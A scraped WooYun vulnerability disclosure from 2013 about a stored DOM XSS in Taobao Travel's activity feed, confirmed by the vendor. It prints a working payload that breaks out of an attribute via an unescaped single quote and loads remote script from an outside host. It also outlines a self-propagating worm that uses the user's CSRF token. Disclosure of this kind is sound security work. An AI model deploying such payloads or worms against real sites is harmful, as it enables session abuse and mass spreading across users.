{"id": 11777, "wybug_id": "wooyun-2013-023994", "wybug_title": "淘宝 xss可引发蠕虫", "wybug_corp": "淘宝网", "wybug_author": "macbin", "wybug_date": "2013-05-17 22:17", "wybug_open_date": "2013-07-01 22:17", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "类型应用", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-01：\t细节向公众公开  简要描述： 某功能有个xss，持久型的，可以引发蠕虫。 详细说明：  淘宝旅行，我的旅行空间，展示我的动态，这里的问题。动态输出内容确实转义了，但是有一个dom型的xss、同时也是持久型的。还挺特殊的，这个要详细说一下：1,先用\"><'，测试，发现转义了，但是单引号没转义。如下：\n\n2，常规xss是没戏了，于是就想看看是不是有dom型的，发现提交的内容会被js拍在一个a标签的data-cfg属性里，如下的commentTitle就是你提交的内容。\n\n而js只是替换了双引号，也没有转义单引号，如下：\n\n3，这样可以用单引号来闭合a 标签的data-cfg属性，然后插入onmouseover事件，当然要让这个a标签容易触发，还可以加个css让它变大一些，鼠标容易碰到。如下：\n\n然后，试了试蠕虫，看可不可行。1，有长度限制，测试了110个字符左右会变成...，内容被隐藏了，只能引入外部文件了。2，用原生js的话还是太长了，不行，看见淘宝都用KISSY，就直接用KISSY.getScript了。3，于是前端payload诞生了：\n' style=display:block;height:800px;width:600px onmouseover=window.x||KISSY.getScript('//tb.jsapp.us') f='\n4，后端js也好弄，就让js自动提交发表新动态就行了，在当前页面取到__tb_token__的值，然后放到请求里，发表内容把刚才的前段payload写上。这样，当你的好友查看你的新动态时，鼠标稍一碰到动态下面的空白区，就会自动发一个恶意的动态，然后不断扩大下去。   漏洞证明：  \n\n   修复方案：  其实单引号也转义一下，保险一点。反正都用了转义，干嘛不全转义了。PS：新人求一个邀请码，万分感谢！   版权声明：转载请注明来源 macbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-05-20 09:49 厂商回复： 非常感谢您对我们的支持与关注，该漏洞我们正在修复~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-18 23:22 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  前排围观。    \n     2013-07-02 10:13 |    \t\t脚本小伙 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:15        | 小书童)\t\t \n  占小板凳！围观！    \n     2013-07-02 10:40 |    \t\tzyymartin \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:22        )\t\t \n  用APPLE的有钱人····    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}